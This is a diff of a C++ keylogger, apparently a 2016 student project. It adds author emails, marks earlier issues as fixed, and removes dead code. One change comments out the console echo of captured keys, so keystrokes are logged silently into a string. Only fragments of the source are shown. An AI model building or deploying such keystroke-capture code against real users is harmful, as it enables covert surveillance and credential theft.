@@ -1,14 +1,13 @@
 /*----------------------------------------------------------------
- *  Author:     1.  Febi Agil Ifdillah - 13514010
- 		2.  Rio Chandra - 13514082
+ *  Author:     1.  Febi Agil Ifdillah - 13514010 (3514010@std.stei.itb.ac.id)
+ 		2.  Rio Chandra - 13514082 (13514082@std.stei.itb.ac.id)
  *  Written:       28/1/2016
- *  Last updated:  30/1/2016
+ *  Last updated:  31/1/2016
  *
  *  Compilation:   g++ -o Keylogger Keylogger.cpp
  *  Execution:     ./Keylogger
  *
  *----------------------------------------------------------------*/
-
 
 #include <iostream>
 #include <fstream>
@@ -39,29 +38,20 @@
 
 /*
 	Issue sementara
-		29 Januari 2016 22:05, "Penulisan ke file menggunakan string dataRekam masih bermasalah."
-		29 Januari 2016 22:05, "fungsi olahKarakter belum mengembalikan karakter yang diinginkan --> belum diperbaiki, butuh perbaikan"
+	       Berhasil - no error;
 */
 
 
 using namespace std;
 
 /* ----------------------------------------
-* 				VARIABEL GLOBAL
+* 		VARIABEL GLOBAL
 * ----------------------------------------*/
 
 // tempat menyimpan semua data rekaman keyboard
 string dataRekam = "";
 string filename;
 ofstream outfile;
-
-//Membuat Dynamic String
-//tidak jadi
-/* *******
-* char *str, charac;
-* int i =0, j =1;
-* str
-********* */
 
 // mengembalikan bentuk karakter dari keyCode Keyboard
 string olahKarakter(int kode, bool biasa){
@@ -230,27 +220,15 @@ void olahMasukan(int in, bool tCtrl, bool tAlt, bool tShift, bool tCapslock){
 		}
 		masukan += (tCtrl || tAlt ? ")" : "");
 	
-		cout << masukan;
+		//cout << masukan;
 	
-		// menyimpan keluaran ke dalam string dataRekam;
 		dataRekam += masukan;
-		//cout << dataRekam << endl;
 	}
 
 
 // mulai merekam masukan keyboard
 void mulaiRekam(){
 	
-	/* ------------------------------
-	* Standard C
-	* FILE *file;
-	
-	* // membuka berkas
-	* if ((file = fopen(namaBerkas, "a+"))==NULL) {
-	*	printf("Tidak bisa membuka file.\n");
-        * exit(1);
-	* }
-	* -------------------------------- */
     time_t now = time(0);
 	tm *ltm = localtime(&now);
 
